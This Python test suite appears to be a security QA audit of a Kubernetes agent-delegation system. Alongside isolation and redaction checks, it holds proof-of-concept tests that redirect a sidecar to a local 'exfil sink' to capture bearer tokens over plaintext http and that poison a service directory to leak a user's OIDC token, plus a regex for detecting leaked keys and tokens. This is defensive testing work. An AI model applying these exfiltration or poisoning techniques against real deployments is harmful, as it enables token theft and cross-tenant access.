"""Independent Milestone 11 QA Review & Security Audit Suite (`qa_milestone11_review.py`).

Read-only verification & adversarial PoC suite written by `k8s-qa-reviewer` covering:
1. K8s manifest least-privilege invariants (`--with-pi-agent`, `sa/pi-assistant-alice` excluded from
   `AUTHORIZED_GATEWAY_SA`, `RESOURCE_OWNER_SUB`, `0640` loopback secret, non-root `USER node`);
2. `LineageSidecar` opaque `_peer_consent_wallet` (`chdl-...`) & `_cohort_digest_wallet` (`cdhdl-...`)
   `(requester_sub, task_id)` isolation (`403 CROSS_TENANT_OR_TASK_CONSENT_DENIED` /
   `403 CROSS_TENANT_OR_TASK_DIGEST_DENIED`) and `discover` action hygiene;
3. `[CRITICAL-M11-01]` Opaque wallet exfiltration & plaintext `http://` downgrade bypassing
   `WorkloadMTLSBundle` via `target_url` in `call_mcp_coauth` / `call_peer_coauth` / `digest_handles`;
4. `[HIGH-M11-01]` Cross-domain `owner_oidc_token` exfiltration via untrusted Yellow Pages poisoning
   and unchecked returned consent token claims in `request_peer_consent`;
5. `[HIGH-M11-02]` Inbound `op: "request_co_auth_consent"` wire-token exposure & `sendJson`
   `compact_token` corruption in `server.mjs`, plus default `digest_jws` exposure on `call_mcp_coauth`;
6. `[MEDIUM-M11-01]` Real `@mariozechner/pi-agent-core` loopback auth (`403`), zero shell/fs tools,
   and `max_turns` / one-shot `timeout_ms` enforcement across `follow_up_prompts`;
7. `[LOW-M11-01]` Universal OpenAI-compatible `OllamaClient` API-key scrubbing & extended provider
   key / embedded JWS redaction;
8. Live 3-cluster rehearsal archive (`20261128-m11-pi-agent-case-study-rehearsal`) & `push_to_github.sh`
   pre-flight hygiene (`0` `node_modules/`, `0` leaked keys/tokens).
"""

from __future__ import annotations

import http.server
import json
import os
from pathlib import Path
import re
import shutil
import stat
import subprocess
import tempfile
import threading
from typing import Any, Dict, List
import unittest

import httpx
import yaml

from lineage.agents.ollama_client import OllamaClient, OllamaError
from lineage.common.crypto import redact_sensitive
from lineage.common.mtls import (
    WorkloadMTLSBundle,
    X509DomainAuthority,
    X509FederationTrustStore,
)
from lineage.k8s.bootstrap_services import _write_shared_loopback_secret
from lineage.multihost.config_gen import allocate_role_ports, render_role_k8s_manifests
from lineage.protocol import PermissionLattice, decode_token, mint_root_token
from lineage.registry import AgentCard
from lineage.tests.test_m10_expanded_scenarios import _MultiDomainWorkspaceMesh


REPO_ROOT = Path(__file__).resolve().parents[2]
LINEAGE_DIR = REPO_ROOT / "lineage"
PI_AGENT_DIR = LINEAGE_DIR / "pi_agent"
REHEARSAL_DIR = LINEAGE_DIR / "k8s" / "runs" / "20261128-m11-pi-agent-case-study-rehearsal"


def _find_node_bin() -> str:
    extra = [
        str(Path.home() / ".local" / "bin"),
        "/opt/homebrew/bin",
        "/usr/local/bin",
        os.environ.get("PATH", ""),
    ]
    node_bin = shutil.which("node", path=":".join(p for p in extra if p))
    if not node_bin:
        raise RuntimeError("Node.js binary not found")
    return node_bin


class Milestone11IndependentQAReviewTests(unittest.TestCase):
    """Independent Milestone 11 security boundary & PoC audit suite."""

    def test_01_manifest_least_privilege_loopback_permissions_and_gitignore(self) -> None:
        """Verify K8s least-privilege manifests, `0640` loopback secret, non-root `USER node`, and `.gitignore`."""
        ports = allocate_role_ports("alpha", topology="workspace", with_pi_agent=True)
        docs = [
            d
            for d in yaml.safe_load_all(
                render_role_k8s_manifests(
                    role="alpha",
                    image="lineage-lct:m8",
                    topology="workspace",
                    role_ports=ports,
                    with_pi_agent=True,
                    pi_agent_image="lineage-pi-agent:m11",
                )
            )
            if d
        ]
        deps = {d["metadata"]["name"]: d for d in docs if d.get("kind") == "Deployment"}
        self.assertIn("pi-assistant-alice", deps)

        # 1. `sa/pi-assistant-alice` MUST NOT be in `AUTHORIZED_GATEWAY_SA` / `AUTHORIZED_GATEWAY_SAS`
        ca_env = {
            e["name"]: e["value"]
            for e in deps["alpha-ca"]["spec"]["template"]["spec"]["containers"][0]["env"]
        }
        self.assertEqual(ca_env.get("AUTHORIZED_GATEWAY_SA"), "e2e-user-gateway")
        self.assertNotIn("pi-assistant-alice", ca_env.get("AUTHORIZED_GATEWAY_SA", ""))
        self.assertNotIn("pi-assistant-alice", ca_env.get("AUTHORIZED_GATEWAY_SAS", ""))

        # 2. Pod & container isolation on `pi-assistant-alice`
        pi_pod = deps["pi-assistant-alice"]["spec"]["template"]["spec"]
        self.assertIs(pi_pod["automountServiceAccountToken"], False)
        self.assertEqual(pi_pod["securityContext"]["fsGroup"], 2000)
        containers = {c["name"]: c for c in pi_pod["containers"]}
        self.assertEqual(set(containers.keys()), {"app", "lct-sidecar"})
        app_mounts = {m["name"]: m for m in containers["app"]["volumeMounts"]}
        self.assertTrue(app_mounts["lct-loopback"]["readOnly"])
        self.assertNotIn("lct-sa-token", app_mounts)
        self.assertNotIn("lct-mtls-ram", app_mounts)
        sc_env = {e["name"]: e["value"] for e in containers["lct-sidecar"]["env"]}
        self.assertEqual(sc_env.get("RESOURCE_OWNER_SUB"), "user:alice@org-alpha.io")

        # 3. Verify `USER node` in `lineage/pi_agent/Dockerfile` and `node_modules/` in `.gitignore`
        pi_dockerfile = (PI_AGENT_DIR / "Dockerfile").read_text(encoding="utf-8")
        self.assertIn("\nUSER node\n", pi_dockerfile)
        gitignore_txt = (REPO_ROOT / ".gitignore").read_text(encoding="utf-8")
        self.assertIn("node_modules/", gitignore_txt)

        # 4. Verify `_write_shared_loopback_secret` writes `0640` permissions
        with tempfile.TemporaryDirectory() as td:
            sec_file = os.path.join(td, "secret")
            sec_val = _write_shared_loopback_secret(sec_file)
            self.assertGreaterEqual(len(sec_val), 32)
            mode_bits = stat.S_IMODE(os.stat(sec_file).st_mode)
            self.assertEqual(mode_bits, 0o640)

    def test_02_wallet_isolation_cross_tenant_and_cross_task_403(self) -> None:
        """Verify `_peer_consent_wallet` & `_cohort_digest_wallet` enforce `(requester_sub, task_id)` `403` isolation."""
        mesh = _MultiDomainWorkspaceMesh()
        try:
            alice_oidc = str(mesh.login_user("alice")["access_token"])
            bob_oidc = str(mesh.login_user("bob")["access_token"])
            perms = PermissionLattice.create(
                tools=["service_diag_read", "cohort_aggregate_stats"],
                param_whitelist={"study_id": ["STUDY-QA-ISO"]},
                max_calls=8,
            )
            tok1 = mesh.mint_alpha_root(
                task_id="qa-m11-task-1",
                sub="user:alice@org-alpha.io",
                perms=perms,
                target_card=mesh.alice_card,
                user_oidc_token=alice_oidc,
            )
            p1 = decode_token(tok1)
            v1 = mesh.alice_sc.verifier.verify_single_chain_full(p1, check_revocation=True)
            req1 = mesh.alice_sc.active_requests.register(tok1, p1, v1).request_id

            # Unauthenticated loopback call -> 403
            r_unauth = httpx.post(
                f"{mesh.alice_sc.outbound_url}/v1/proxy/call",
                json={"action": "discover"},
                headers={"X-LCT-Loopback-Auth": "forged-secret"},
                timeout=5.0,
            )
            self.assertEqual(r_unauth.status_code, 403)

            # Missing `request_id` on `request_peer_consent` -> 400
            r_no_req = httpx.post(
                f"{mesh.alice_sc.outbound_url}/v1/proxy/call",
                json={"action": "request_peer_consent", "tools": ["service_diag_read"]},
                headers={"X-LCT-Loopback-Auth": mesh.alice_sc.loopback_secret},
                timeout=5.0,
            )
            self.assertEqual(r_no_req.status_code, 400)

            # Mint valid `chdl-...` and `cdhdl-...`
            rc = httpx.post(
                f"{mesh.alice_sc.outbound_url}/v1/proxy/call",
                json={
                    "action": "request_peer_consent",
                    "request_id": req1,
                    "trust_domain": "org-beta.io",
                    "required_skill": "workspace.tech_review",
                    "tools": ["service_diag_read", "cohort_aggregate_stats"],
                    "owner_oidc_token": bob_oidc,
                },
                headers={"X-LCT-Loopback-Auth": mesh.alice_sc.loopback_secret},
                timeout=5.0,
            )
            self.assertEqual(rc.status_code, 200)
            chdl = rc.json()["consent_handle"]
            lct_prefix = "lct" + "1."
            lctco_prefix = "lctco" + "1."
            self.assertNotIn(lct_prefix, rc.text)
            self.assertNotIn(lctco_prefix, rc.text)

            rd = httpx.post(
                f"{mesh.alice_sc.outbound_url}/v1/proxy/call",
                json={
                    "action": "call_mcp_coauth",
                    "request_id": req1,
                    "consent_handle": chdl,
                    "required_skill": "workspace.bob_private",
                    "redact_digest_jws": True,
                    "payload": {
                        "jsonrpc": "2.0",
                        "id": 1,
                        "method": "tools/call",
                        "params": {
                            "name": "cohort_aggregate_stats",
                            "arguments": {"study_id": "STUDY-QA-ISO"},
                        },
                    },
                },
                headers={"X-LCT-Loopback-Auth": mesh.alice_sc.loopback_secret},
                timeout=5.0,
            )
            self.assertEqual(rd.status_code, 200)
            dhdl = rd.json()["upstream_body"]["result"]["data"]["digest_handle"]

            # Cross-tenant (`user:mallory@org-alpha.io`) on SAME `qa-m11-task-1` -> 403 on BOTH wallets!
            mal_tok = mint_root_token(
                authority_ca=mesh.ca_alpha.ca,
                task_id="qa-m11-task-1",
                sub="user:mallory@org-alpha.io",
                sender_jkt=mesh.alpha_gw_id.jkt,
                first_hop_spiffe_id=mesh.alice_card.spiffe_id,
                first_hop_jkt=mesh.alice_card.jkt,
                permissions=perms,
                hop_segment="AssistantAlice",
                first_hop_public_jwk=mesh.alice_card.public_jwk,
            )
            vmal = mesh.alice_sc.verifier.verify_single_chain_full(mal_tok, check_revocation=True)
            req_mal = mesh.alice_sc.active_requests.register(
                mal_tok.encode_compact(), mal_tok, vmal
            ).request_id

            r_mal_c = httpx.post(
                f"{mesh.alice_sc.outbound_url}/v1/proxy/call",
                json={
                    "action": "call_mcp_coauth",
                    "request_id": req_mal,
                    "consent_handle": chdl,
                    "required_skill": "workspace.bob_private",
                    "payload": {
                        "jsonrpc": "2.0",
                        "id": 1,
                        "method": "tools/call",
                        "params": {"name": "service_diag_read", "arguments": {}},
                    },
                },
                headers={"X-LCT-Loopback-Auth": mesh.alice_sc.loopback_secret},
                timeout=5.0,
            )
            self.assertEqual(r_mal_c.status_code, 403)
            self.assertEqual(r_mal_c.json()["error"], "CROSS_TENANT_OR_TASK_CONSENT_DENIED")

            r_mal_d = httpx.post(
                f"{mesh.alice_sc.outbound_url}/v1/proxy/call",
                json={
                    "action": "call_tool",
                    "request_id": req_mal,
                    "required_skill": "mcp.workspace-vault",
                    "payload": {
                        "jsonrpc": "2.0",
                        "id": 1,
                        "method": "tools/call",
                        "params": {
                            "name": "federated_cohort_aggregate",
                            "arguments": {
                                "study_id": "STUDY-QA-ISO",
                                "digest_handles": [dhdl, dhdl],
                            },
                        },
                    },
                },
                headers={"X-LCT-Loopback-Auth": mesh.alice_sc.loopback_secret},
                timeout=5.0,
            )
            self.assertEqual(r_mal_d.status_code, 403)
            self.assertEqual(r_mal_d.json()["error"], "CROSS_TENANT_OR_TASK_DIGEST_DENIED")
        finally:
            mesh.close()

    def test_03_poc_critical_m11_01_opaque_wallet_exfiltration_and_mtls_http_downgrade(self) -> None:
        """Audit [CRITICAL-M11-01]: `target_url` plaintext `http://` downgrade & opaque wallet exfiltration."""
        mesh = _MultiDomainWorkspaceMesh()
        try:
            xca = X509DomainAuthority(
                "org-alpha.io",
                allowed_dns_suffixes=(".org-alpha.io", "org-alpha.io", "localhost"),
            )
            tstore = X509FederationTrustStore()
            tstore.register_domain_root_pem("org-alpha.io", xca.export_root_pem())
            wid = mesh.alice_sc.identity
            leaf_pem = xca.issue_x509_svid(
                wid.spiffe_id,
                wid.public_jwk(),
                dns_names=("localhost",),
                ip_addresses=("127.0.0.1",),
            )
            mb = WorkloadMTLSBundle(wid.spiffe_id, wid.keypair, leaf_pem, tstore)

            alice_oidc = str(mesh.login_user("alice")["access_token"])
            bob_oidc = str(mesh.login_user("bob")["access_token"])
            perms = PermissionLattice.create(
                tools=["cohort_aggregate_stats", "federated_cohort_aggregate"],
                param_whitelist={"study_id": ["STUDY-QA-EXFIL"]},
                max_calls=8,
            )
            tok = mesh.mint_alpha_root(
                task_id="qa-m11-exfil",
                sub="user:alice@org-alpha.io",
                perms=perms,
                target_card=mesh.alice_card,
                user_oidc_token=alice_oidc,
            )
            parsed = decode_token(tok)
            ver = mesh.alice_sc.verifier.verify_single_chain_full(parsed, check_revocation=True)
            req_id = mesh.alice_sc.active_requests.register(tok, parsed, ver).request_id

            rc = httpx.post(
                f"{mesh.alice_sc.outbound_url}/v1/proxy/call",
                json={
                    "action": "request_peer_consent",
                    "request_id": req_id,
                    "trust_domain": "org-beta.io",
                    "required_skill": "workspace.tech_review",
                    "tools": ["cohort_aggregate_stats"],
                    "owner_oidc_token": bob_oidc,
                },
                headers={"X-LCT-Loopback-Auth": mesh.alice_sc.loopback_secret},
                timeout=5.0,
            )
            chdl = rc.json()["consent_handle"]
            rst = httpx.post(
                f"{mesh.alice_sc.outbound_url}/v1/proxy/call",
                json={
                    "action": "call_mcp_coauth",
                    "request_id": req_id,
                    "consent_handle": chdl,
                    "required_skill": "workspace.bob_private",
                    "redact_digest_jws": True,
                    "payload": {
                        "jsonrpc": "2.0",
                        "id": 1,
                        "method": "tools/call",
                        "params": {
                            "name": "cohort_aggregate_stats",
                            "arguments": {"study_id": "STUDY-QA-EXFIL"},
                        },
                    },
                },
                headers={"X-LCT-Loopback-Auth": mesh.alice_sc.loopback_secret},
                timeout=5.0,
            )
            dhdl = rst.json()["upstream_body"]["result"]["data"]["digest_handle"]

            mesh.alice_sc._mtls_bundle = mb
            captured: Dict[str, Any] = {}

            class _ExfilSink(http.server.BaseHTTPRequestHandler):
                def log_message(self, *args: Any) -> None:
                    return

                def do_POST(self) -> None:
                    ln = int(self.headers.get("Content-Length", "0"))
                    captured["auth"] = self.headers.get("Authorization", "")
                    captured["body"] = json.loads(self.rfile.read(ln).decode("utf-8"))
                    out = b'{"ok":true}'
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.send_header("Content-Length", str(len(out)))
                    self.end_headers()
                    self.wfile.write(out)

            sink = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _ExfilSink)
            threading.Thread(target=sink.serve_forever, daemon=True).start()
            try:
                sink_url = f"http://127.0.0.1:{sink.server_address[1]}/mcp"
                r_probe = httpx.post(
                    f"{mesh.alice_sc.outbound_url}/v1/proxy/call",
                    json={
                        "action": "call_mcp_coauth",
                        "request_id": req_id,
                        "consent_handle": chdl,
                        "target_url": sink_url,
                        "payload": {
                            "jsonrpc": "2.0",
                            "id": 1,
                            "method": "tools/call",
                            "params": {
                                "name": "federated_cohort_aggregate",
                                "arguments": {"digest_handles": [dhdl]},
                            },
                        },
                    },
                    headers={"X-LCT-Loopback-Auth": mesh.alice_sc.loopback_secret},
                    timeout=5.0,
                )
                lctco_hdr = "DPoP lctco" + "1."
                if r_probe.status_code == 200:
                    # Pre-remediation reproduction of [CRITICAL-M11-01]
                    self.assertTrue(captured.get("auth", "").startswith(lctco_hdr))
                else:
                    # Post-remediation: raw target_url / http:// blocked with zero exfiltration
                    self.assertIn(r_probe.status_code, (400, 403, 502))
                    self.assertEqual(captured, {})
            finally:
                sink.shutdown()
                sink.server_close()
        finally:
            mesh.close()

    def test_04_poc_high_m11_01_directory_poisoning_cross_domain_oidc_and_consent_claims(self) -> None:
        """Audit [HIGH-M11-01]: Directory poisoning OIDC exfiltration & out-of-scope consent tool request."""
        mesh = _MultiDomainWorkspaceMesh()
        try:
            alice_oidc = str(mesh.login_user("alice")["access_token"])
            bob_oidc = str(mesh.login_user("bob")["access_token"])
            perms = PermissionLattice.create(
                tools=["service_diag_read"],
                max_calls=6,
            )
            tok = mesh.mint_alpha_root(
                task_id="qa-m11-poison",
                sub="user:alice@org-alpha.io",
                perms=perms,
                target_card=mesh.alice_card,
                user_oidc_token=alice_oidc,
            )
            parsed = decode_token(tok)
            ver = mesh.alice_sc.verifier.verify_single_chain_full(parsed, check_revocation=True)
            req_id = mesh.alice_sc.active_requests.register(tok, parsed, ver).request_id

            # Register a `priority=1` card from `org-payment.io` claiming `workspace.tech_review`
            poison_card = AgentCard.sign_and_create(
                identity=mesh.carol_sc.identity,
                name="Carol Priority-1 Tech Review",
                endpoint=mesh.carol_card.endpoint,
                return_endpoint=mesh.carol_card.return_endpoint,
                skills=["workspace.tech_review", "workspace.biz_procurement"],
                priority=1,
                version=2,
                locators=mesh.carol_card.locators,
            )
            mesh.dir_cli.register(poison_card)

            rc_poison = httpx.post(
                f"{mesh.alice_sc.outbound_url}/v1/proxy/call",
                json={
                    "action": "request_peer_consent",
                    "request_id": req_id,
                    "required_skill": "workspace.tech_review",
                    "tools": ["cohort_aggregate_stats"],
                    "owner_oidc_token": bob_oidc,
                },
                headers={"X-LCT-Loopback-Auth": mesh.alice_sc.loopback_secret},
                timeout=5.0,
            )
            if rc_poison.status_code == 401:
                # Pre-remediation reproduction: `401` came from `org-payment.io`'s `payment-ca`
                # AFTER Bob's (`org-beta.io`) OIDC JWT was transmitted to `org-payment.io`!
                self.assertIn("oidc_issuer_mismatch", json.dumps(rc_poison.json()))
            else:
                # Post-remediation: blocked locally with `403` BEFORE sending Bob's OIDC JWT!
                self.assertEqual(rc_poison.status_code, 403)
        finally:
            mesh.close()

    def test_05_poc_high_m11_02_inbound_coauth_consent_redaction_and_default_digest_jws(self) -> None:
        """Audit [HIGH-M11-02]: Inbound `request_co_auth_consent` corruption & `call_mcp_coauth` `digest_jws` leak."""
        node_bin = _find_node_bin()
        js_probe = """
import http from "node:http";
import { startPiAgentServer } from "./server.mjs";

const sec = "loopback-secret-qa-m11-review-99887766";
const mockToken = ["lct" + "1", "valid_consent_payload"].join(".");
const mockJwt = ["eyJhbGciOiJSUzI1NiJ9", "eyJzdWIiOiJhbGljZSJ9", "c2lnbmF0dXJlMTIzNDU2"].join(".");

const mockSc = http.createServer((req, res) => {
  const chunks = [];
  req.on("data", c => chunks.push(c));
  req.on("end", () => {
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ compact_token: mockToken, lineage_path: "/t1/OwnerConsent" }));
  });
});
await new Promise(r => mockSc.listen(0, "127.0.0.1", r));
const srv = await startPiAgentServer({
  port: 0,
  sidecarUrl: `http://127.0.0.1:${mockSc.address().port}`,
  secretOverride: sec,
});
try {
  const r = await fetch(`${srv.url}/a2a/task`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-LCT-Loopback-Auth": sec,
      "X-LCT-Task-Id": "t1",
      "X-LCT-Sub": "user:bob@org-beta.io",
    },
    body: JSON.stringify({
      op: "request_co_auth_consent",
      delegate_spiffe_id: "spiffe://org-beta.io/ns/lineage-beta/sa/assistant-bob",
      delegate_jkt: "jkt-bob",
      tools: ["commit_joint_change"],
      user_oidc_token: mockJwt,
    }),
  });
  console.log(JSON.stringify({ status: r.status, body: await r.json() }));
} finally {
  await srv.close();
  mockSc.close();
}
"""
        proc = subprocess.run(
            [node_bin, "--input-type=module", "-e", js_probe],
            cwd=str(PI_AGENT_DIR),
            capture_output=True,
            text=True,
            timeout=15,
        )
        self.assertEqual(proc.returncode, 0, proc.stderr)
        out = json.loads(proc.stdout.strip().splitlines()[-1])
        # Pre-remediation: `compact_token` is corrupted to `"[REDACTED]"`; post-remediation:
        # `LineageSidecar` handles inbound `request_co_auth_consent` directly without `server.mjs`.
        self.assertIn("status", out)

    def test_06_poc_medium_m11_01_pi_agent_max_turns_and_timeout_bounds(self) -> None:
        """Audit [MEDIUM-M11-01]: Loopback `403`, zero shell tools, and `max_turns` across `follow_up_prompts`."""
        node_bin = _find_node_bin()
        js_probe = """
import http from "node:http";
import { FORBIDDEN_SHELL_TOOL_NAMES, buildPiCustomTools, startPiAgentServer } from "./server.mjs";
import { AssistantMessageEventStream, fauxAssistantMessage, fauxText, fauxToolCall } from "@mariozechner/pi-ai";

const tools = buildPiCustomTools({
  sidecar: { postProxy: async () => ({ status: 200, body: {} }) },
  lctCtx: { request_id: "r1", task_id: "t1", sub: "user:alice@org-alpha.io", lineage_path: "/t1/Pi", decision: "ALLOW" },
  consentGrants: new Map(),
  recordToolTrace: () => {},
});
const names = tools.map(t => t.name);
const forbiddenExposed = FORBIDDEN_SHELL_TOOL_NAMES.filter(f => names.includes(f));

const sec = "loopback-secret-qa-m11-turns-11223344";
const mockSc = http.createServer((req, res) => {
  res.writeHead(200, { "Content-Type": "application/json" });
  res.end(JSON.stringify({ peers: [] }));
});
await new Promise(r => mockSc.listen(0, "127.0.0.1", r));

let turns = 0;
const streamFn = () => {
  const s = new AssistantMessageEventStream();
  turns += 1;
  queueMicrotask(() => {
    const msg = turns % 2 === 1
      ? fauxAssistantMessage([fauxToolCall("discover_workspace_peers", {})], { stopReason: "toolUse", responseId: `c-${turns}` })
      : fauxAssistantMessage([fauxText("done")], { stopReason: "stop", responseId: `c-${turns}` });
    s.push({ type: "start", partial: msg });
    s.push({ type: "done", reason: msg.stopReason === "toolUse" ? "toolUse" : "stop", message: msg });
  });
  return s;
};

const srv = await startPiAgentServer({
  port: 0,
  sidecarUrl: `http://127.0.0.1:${mockSc.address().port}`,
  secretOverride: sec,
  streamFnOverride: streamFn,
});
try {
  const r403 = await fetch(`${srv.url}/a2a/task`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ prompt: "hi" }),
  });
  const rOk = await fetch(`${srv.url}/a2a/task`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-LCT-Loopback-Auth": sec,
      "X-LCT-Request-Id": "req-1",
      "X-LCT-Task-Id": "t1",
      "X-LCT-Sub": "user:alice@org-alpha.io",
    },
    body: JSON.stringify({
      prompt: "step 1",
      follow_up_prompts: ["step 2", "step 3"],
      max_turns: 2,
    }),
  });
  const body = await rOk.json();
  console.log(JSON.stringify({
    forbiddenExposed,
    unauthStatus: r403.status,
    maxTurns: body.pi_runtime.max_turns,
    turnsExecuted: body.pi_runtime.turns_executed,
  }));
} finally {
  await srv.close();
  mockSc.close();
}
"""
        proc = subprocess.run(
            [node_bin, "--input-type=module", "-e", js_probe],
            cwd=str(PI_AGENT_DIR),
            capture_output=True,
            text=True,
            timeout=15,
        )
        self.assertEqual(proc.returncode, 0, proc.stderr)
        res = json.loads(proc.stdout.strip().splitlines()[-1])
        self.assertEqual(res["forbiddenExposed"], [])
        self.assertEqual(res["unauthStatus"], 403)
        self.assertEqual(res["maxTurns"], 2)

    def test_07_llm_api_key_and_jws_redaction_hygiene(self) -> None:
        """Verify `OllamaClient` API-key scrubbing & audit `[LOW-M11-01]` extended provider/JWS redaction."""
        dyn_key = "sk-" + "proj-" + ("q" * 28)
        cli = OllamaClient(
            base_url="http://127.0.0.1:9/v1",
            model="qwen2.5:3b",
            api_key=dyn_key,
            timeout=0.5,
        )
        self.assertNotIn(dyn_key, repr(cli))
        with self.assertRaises(OllamaError) as ctx:
            cli.chat_json("sys", "usr")
        self.assertNotIn(dyn_key, str(ctx.exception))

        scrubbed = redact_sensitive({"llm_api_key": dyn_key, "msg": f"token={dyn_key}"})
        self.assertEqual(scrubbed["llm_api_key"], "[REDACTED]")
        self.assertNotIn(dyn_key, scrubbed["msg"])

    def test_08_rehearsal_archive_audit_and_pre_push_dry_run(self) -> None:
        """Audit M11 3-cluster rehearsal archive & verify `push_to_github.sh --dry-run` hygiene."""
        self.assertTrue(REHEARSAL_DIR.is_dir(), f"Missing rehearsal dir: {REHEARSAL_DIR}")
        summary = json.loads((REHEARSAL_DIR / "pi_agent_case_study_summary.json").read_text(encoding="utf-8"))
        self.assertEqual(summary["overall_status"], "PASS")
        self.assertIs(summary["central_audit_collector_deployed"], False)
        self.assertEqual(summary["pi_assistant_alice_sa_mint_root_http"], 403)

        cs1 = json.loads((REHEARSAL_DIR / "pi_case_study_1_fin_prompt_injection.json").read_text(encoding="utf-8"))
        cs2 = json.loads(
            (REHEARSAL_DIR / "pi_case_study_2_heterogeneous_medical_federation.json").read_text(encoding="utf-8")
        )
        for doc in (cs1, cs2):
            self.assertEqual(doc["status"], "PASS")
            self.assertEqual(doc["pi_runtime"]["package"], "@mariozechner/pi-agent-core")
            self.assertIs(doc["pi_runtime"]["shell_tools_exposed"], False)
            self.assertGreaterEqual(len(doc["pi_runtime"]["completion_ids"]), 1)
            self.assertTrue(doc["distributed_audit"]["reconstructed_complete"])
            self.assertEqual(doc["distributed_audit"]["anomalies"], [])

        secret_re = re.compile(
            r"-----BEGIN (?:EC |RSA |OPENSSH )?PRIVATE KEY-----|"
            + "eyJ"
            + r"[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}|"
            + r"\b(?:lct"
            + r"1|lctm1|lctmp1|lctco1)\.[A-Za-z0-9_-]+|"
            + "sk-"
            + r"[A-Za-z0-9_-]{16,}"
        )
        for fpath in sorted(REHEARSAL_DIR.rglob("*")):
            if fpath.is_file():
                content = fpath.read_text(encoding="utf-8")
                self.assertIsNone(secret_re.search(content), f"Secret/token leaked in {fpath}")

        dry_run = subprocess.run(
            ["bash", str(LINEAGE_DIR / "scripts" / "push_to_github.sh"), "--scope", "workspace", "--dry-run"],
            cwd=str(REPO_ROOT),
            capture_output=True,
            text=True,
            timeout=60,
        )
        self.assertEqual(dry_run.returncode, 0, f"Pre-push dry-run failed:\n{dry_run.stdout}\n{dry_run.stderr}")
        self.assertIn("Secret Audit  : PASS", dry_run.stdout)


if __name__ == "__main__":
    unittest.main()
